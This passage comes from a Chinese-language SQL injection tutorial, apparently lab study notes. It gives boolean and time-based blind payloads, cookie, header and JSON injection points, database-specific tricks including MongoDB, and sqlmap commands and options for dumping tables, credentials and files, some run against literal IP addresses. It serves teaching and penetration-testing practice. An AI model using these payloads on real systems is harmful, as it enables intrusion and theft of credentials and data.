--+</span><br><span class="line">&#x27;or ORD(mid(database(),1,1)) &gt; 100 --+ :  # 因为需要验证的字符太多，所以可以转化为ascii码验证</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解表的总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   # 判断表的总数</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解各个表名的长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解第一个表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = &#x27;a&#x27;  --+</span><br><span class="line">或者</span><br><span class="line">&#x27;rr ord(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解表的字段的总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 0,1) = 10 --+</span><br><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = 10 --+ （第二个字段）</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解第一个字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1) = &#x27;i&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1)) &gt; 100 --+</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = &#x27;username&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解内容长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如已经知道字段名为  id   username password</span><br><span class="line">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;a&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+    ASCII码猜解</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;admin-----123456&#x27;   --+</span><br></pre></td></tr></table></figure></li></ul><h4 id="基于时间的SQL盲注（最后考虑）"><a href="#基于时间的SQL盲注（最后考虑）" class="headerlink" title="基于时间的SQL盲注（最后考虑）"></a>基于时间的SQL盲注（最后考虑）</h4><p>对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 、<code>benchmark()</code>函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。</p><p>延时判断，if、sleep。</p><ul><li><p>if(expr1, expr2,expr3)</p><p>如果expr1是TRUE，则IF0的返回值为expr2;否则返回值则为expr3。if()的返回值为数字值或字符串值。具体情况视其所在语境而定。</p><p>若数据库名为a，则回显123，否则回显456：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200138619.png" alt="image-20220727200138619"></p></li><li><p>if + sleep</p><p>若数据库名为a，则延时1s，否则不延时。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200249771.png" alt="image-20220727200249771"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 猜解数据库名长度，猜中了延时5s</span><br><span class="line">id=1 and sleep(if(length(database())=8,5,0))--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解数据库名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解表名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;# 判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27;# 匹配xiaodi及xiaodi...等if(条件,5,0)</span><br><span class="line">ord()                           # 转换成ascii码</span><br><span class="line">mid (a, b, c)# 从位置b开始，截取a字符串的c个字符</span><br><span class="line">substr(a, b, c)# 与mid函数一样，从b位置开始，截取字符串a的c长度</span><br><span class="line">left (database(),1), database() # left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8    # 判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 # 判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure><p><strong>盲注的加速方法</strong>：</p><p>减少查询次数，提高查找的正确率。</p><ul><li><p><strong>二分法</strong>爆破字符；</p></li><li><p><strong>位运算法</strong></p><p>每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;实现取某一位的值。</p></li></ul><h3 id="按照注入的数据类型"><a href="#按照注入的数据类型" class="headerlink" title="按照注入的数据类型"></a>按照注入的数据类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是数值类型。构造注入语句时不需要单引号和#来闭合语法。</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是字符型。一般字符型注入需要构造单引号&#x2F;双引号用于闭合语法，还需要加入注释符使原本的引号以及后面的语句无效。</p><p><strong>除单引号外，SQL语句也有其他的一些干扰符号：’ “ % ) }等，具体需看写法。</strong></p><p>比如<code>select * from user where name like &#39;%xiaodi%&#39;;</code>用于搜索name字段中含有<code>xiaodi</code>的记录。或者<code>select * from user where name=(&#39;xiaodi&#39;);</code>增加了括号。</p><p>这时注入的话就要考虑%来闭合语法。实际中应该用什么符号来闭合语法需要自己尝试。</p><p>&#x3D;&#x3D;<strong>如何判断字符型、数字型</strong>&#x3D;&#x3D;</p><p>比如在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，若都能返回数据（都通过），说明可能注入漏洞不是数字型，应该是字符型形式 ；因为对于字符型，使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>这样网站对于<code>&#39;1 and 1=1&#39;</code>或者<code>&#39;1 and 1=2&#39;</code>都是取前面的1，都返回数据。</p><p>此时在文本框输入 <code>1&#39; and 1=1#</code>，可以返回数据，输入 <code>1&#39; and 1=2#</code>，没有数据返回，说明注入成功，确认漏洞为<code>id=&#39;1&#39; and 1=1#&#39;</code>的字符型SQL注入；（注意：有时用于闭合语法的不一定为单引号，另外在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现）</p><p>若在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，前者返回数据，后者不返回，直接确定是 <code>id=1 and 1=1</code>的数值型形式。</p><h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>使用了<code>select * from users where id like &#39;%233&#39;</code>之类的模糊匹配，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">word=a%&#x27; and 1=1#     返回正确</span><br><span class="line">word=a%&#x27; and 1=2#     返回错误</span><br></pre></td></tr></table></figure><h3 id="按照提交参数方式"><a href="#按照提交参数方式" class="headerlink" title="按照提交参数方式"></a>按照提交参数方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];    <span class="comment">//get接受参数名g的值赋值给变量get</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$get</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];  <span class="comment">//post接受参数名p的值赋值给变量post</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;c&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP USER AGENT&#x27;</span>];    <span class="comment">// php内置函数，用于获取一些参数信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727103622802.png" alt="image-20220727103622802" style="zoom:67%;"><h4 id="get数据注入"><a href="#get数据注入" class="headerlink" title="get数据注入"></a>get数据注入</h4><p>get数据的注入在前面已经详细说明。</p><h4 id="post数据注入"><a href="#post数据注入" class="headerlink" title="post数据注入"></a>post数据注入</h4><p>（sqlilabs less 11）</p><p>网站的URL不会显示具体的参数，而是将参数放在web表单中以post请求的形式提交。</p><p>此时需要使用 Burpsuite 等工具来构造 POST 包。BP抓包之后在数据包中进行相同的注入流程。</p><p>或者使用hackbar构造post数据也可。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15617979867982.jpg" alt="img" style="zoom:33%;"><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>（sqlilabs less 20）</p><p>有时网站对get、post请求都进行了关键词过滤，难以注入，但是忽略了cookie也可以传递参数。如果cookie的参数也被用于SQL语句，那么也有成功注入的可能。有时使用cookie传参时会与post冲突，此时可能需要改为使用GET请求。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727144345092.png" alt="image-20220727144345092"></p><h4 id="request请求注入"><a href="#request请求注入" class="headerlink" title="request请求注入"></a>request请求注入</h4><p>如果网站是request请求，那么可以在所有方法的位置提交，包括get、post、cookie。</p><p>下面的网站以get或post都能提交参数：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727105414609.png" alt="image-20220727105414609"></p><h4 id="SERVER注入"><a href="#SERVER注入" class="headerlink" title="$_SERVER注入"></a>$_SERVER注入</h4><p>php内置函数，用于获取一些参数信息。</p><p>$_SERVER详解：<a href="https://blog.csdn.net/lky_for_lucky/article/details/111300340">https://blog.csdn.net/lky_for_lucky/article/details/111300340</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;] //浏览器语言</span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户IP</span><br><span class="line">$_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户[主机名]</span><br></pre></td></tr></table></figure><p>如果通过$_SERVER获取的信息被用于SQL语句，那么就可能存在注入漏洞。</p><p>比如BP抓包后，将浏览器信息User-Agent进行修改。如果网站将User-Agent字段作为SQL语句的参数，那就可能存在注入成功的可能。</p><h4 id="json数据注入"><a href="#json数据注入" class="headerlink" title="json数据注入"></a>json数据注入</h4><p>原理一样与其他注入一样，只是注入点改为json的键值对中的值。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png" alt="image.png" style="zoom:67%;"><h4 id="HTTP头部参数注入"><a href="#HTTP头部参数注入" class="headerlink" title="HTTP头部参数注入"></a>HTTP头部参数注入</h4><p>（sqlilabs less 18）</p><p>有些网站调用php的$_SERVER获取一些HTTP头部信息，比如User-Agent。这些地方可以进行注入。</p><p>还有X- Forwarded- For，简称XFF头，它代表客户端真实的IP。这里也可以尝试进行注入。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727145345768.png" alt="image-20220727145345768"></p><p>上例中的SQL语句为insert操作，无法像select一样回显信息，因此只能盲注。</p><h2 id="8-各种数据库注入"><a href="#8-各种数据库注入" class="headerlink" title="8. 各种数据库注入"></a>8. 各种数据库注入</h2><p><a href="https://blog.csdn.net/qq_42438245/article/details/121579063">https://blog.csdn.net/qq_42438245/article/details/121579063</a></p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727150100470.png" alt="image-20220727150100470" style="zoom:50%;"><p><strong>各种数据库的注入特点</strong></p><p>不同的数据库具有不同的注入特点，每个数据库支持的功能不一样，获取到的权限和可执行操作等不同。</p><p>包括access、mysql、mssql、mongoDB、postgresql、sqlite、oracle、sybase等。</p><h3 id="access注入（暴力）"><a href="#access注入（暴力）" class="headerlink" title="access注入（暴力）"></a>access注入（暴力）</h3><p>access数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa，结构为表名&#x2F;列名&#x2F;数据，不同的网站会有各自的acess数据库。不会像mySQL那样一个网站的管理员可以操作多个mySQL数据库，导致存在跨库注入的情况。mySQL的结构为数据库名&#x2F;表名&#x2F;列名&#x2F;数据。</p><p>access没有information_ schema表，数据库名、操作系统等等都无法查询，<u>只能暴力猜解表名、列名、数据</u>，可以通过一些暴库手段、目录猜解等下载数据库。</p><ul><li><p>判断数据库类型</p><p>由于各个数据库特征不同，这里直接使用sqlmap比较方便：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727152142889.png" alt="image-20220727152142889"></p></li><li><p>判断注入点</p></li><li><p>猜解字段数量</p><p>oder by</p></li><li><p>判断哪几个位置回显</p><p><code>?id=-1 union select 1,2,3</code></p></li><li><p>暴力猜解表名、列名等信息</p><p>比如猜当前表为admin，看是否成功返回数据：</p><p><code>?id=-1 union select 1,2,3 from admin</code></p></li></ul><p>使用工具进行暴力猜解：</p><p>尝试爆表名：<code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --tables</code> </p><p>尝试爆表admin的列名： <code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --dump -T &quot;admin&quot;</code></p><h3 id="msSQL注入（pangolin穿山甲）"><a href="#msSQL注入（pangolin穿山甲）" class="headerlink" title="msSQL注入（pangolin穿山甲）"></a>msSQL注入（pangolin穿山甲）</h3><ul><li><p>判断数据库类型</p><p>由于各个数据库特征不同，这里直接使用pangolin穿山甲工具进行判断：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727153727547.png" alt="image-20220727153727547"></p><p>从工具中还可以看到不同数据库可以获得的权限，明显msSQL可以得到更多权限。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154114341.png" alt="image-20220727154114341"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154006163.png" alt="image-20220727154006163"></p><p>在信息一栏中可以查看到数据库的各种信息：版本、数据库名、计算机名、数据库名、管理员最高权限、Sql-server对应root （mysql）、数据库各表名、磁盘、用户组、用户等。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154518550.png" alt="image-20220727154518550" style="zoom:50%;"><p>在获取数据一栏中可以获取数据库信息，表名数据等</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154538662.png" alt="image-20220727154538662" style="zoom:50%;"></li><li><p>msSQL的手工注入</p><p>语句会与mySQL不同：</p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582849.html">https://www.cnblogs.com/wuhongbin/p/15582849.html</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p></li></ul><h3 id="postgreSQL注入"><a href="#postgreSQL注入" class="headerlink" title="postgreSQL注入"></a>postgreSQL注入</h3><ul><li>可以使用工具：sqlmap、pangolin穿山甲</li></ul><p>识别数据库类型：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1</code></p><p>判断数据库权限：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3</code></p><p>判断是否为数据库管理员：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3</code></p><p>查看当前数据库：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch</code></p><p>查看名为public的数据库的表名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables</code></p><p>查看表reg_users 的列名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns</code></p><p>查看表reg_users 的具体数据：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C &quot;name,password&quot; --dump --batch</code></p><ul><li><p>手工注入，某些语句会有差别：</p><p><a href="https://blog.csdn.net/hack8/article/details/6427911">https://blog.csdn.net/hack8/article/details/6427911</a></p><p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p></li></ul><h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><ul><li><p>使用工具：sqlmap、pangolin穿山甲</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727162001437.png" alt="image-20220727162001437"></p></li><li><p>手工注入</p><p>参考文档：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p></li></ul><h3 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h3><ul><li><p>使用工具</p><p>SQLmap不能识别MongoDB，这里介绍nosqlattack：<a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p><p>首先输入目标网站IP：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164245044.png" alt="image-20220727164245044"></p><p>然后输入路径：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164313282.png" alt="image-20220727164313282"></p><p>尝试攻击：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164346561.png" alt="image-20220727164346561"></p></li><li><p>手工注入</p><p>参考文档：</p><p><a href="https://blog.csdn.net/qq_39936434/article/details/95319449">https://blog.csdn.net/qq_39936434/article/details/95319449</a></p><p><a href="https://www.cnblogs.com/wefeng/p/11503102.html">https://www.cnblogs.com/wefeng/p/11503102.html</a></p><p>Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where, 而mongodb是以键值对形式进行查询的。</p><p>比如按id&#x3D;”1”查询表news中的数据：<code>select * from admin &#123;&#39;id&#39;: &#39;1&#39;&#125;)</code>。</p><ul><li><p>构建回显，mongoDB查询操作的源代码为findone({‘id’：‘1’})</p><p>攻击语句：<code>/new_list.php?id=1&#39;&#125;);return(&#123;title:1,content:&#39;2</code></p><p><img src="https://i0.hdslb.com/bfs/article/4e7e306f459dea0d7e0f0f629cfc5164865c521c.png@831w_207h_progressive.webp" alt="img"></p></li><li><p>爆库</p><p><code>/new_list.php?id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1</code></p><p>—tojson() 方法可以将 Date 对象转换为字符串格式化为 JSON 数据格式，相当于MySQL的数据库名。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/58e82612a8625ea7cb239e0e56529d8b36c06def.png@831w_168h_progressive.webp" alt="img"></p></li><li><p>爆表</p><p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.getCollectionNames()),content:&#39;1</code> </p><p>db.getCollectionNames()返回的是数组，转化为json格式，相当于MySQL的tables。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/193beaae0edc48fde33c165acbb2ee1e430c4600.png@831w_210h_progressive.webp" alt="img"></p></li><li><p>查询指定数据</p><p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p><p>元素集中查找使用E.find(expr)函数，用于从匹配的元素集E的子元素中找出与find指定表达式expr相匹配的元素集合，E 同 expr 可视作同父子元素关系.</p><p>find()[0]为第一条数据，find()[1]为第二条</p><p>由于是字典形式，所以键和值一起出来了，不需要额外查询列。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/7bd9545127c9714df2a53416d7caa935b305e196.png@831w_290h_progressive.webp" alt="img"></p></li></ul></li></ul><h2 id="9-sqlmap"><a href="#9-sqlmap" class="headerlink" title="9. sqlmap"></a>9. sqlmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库类型(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span 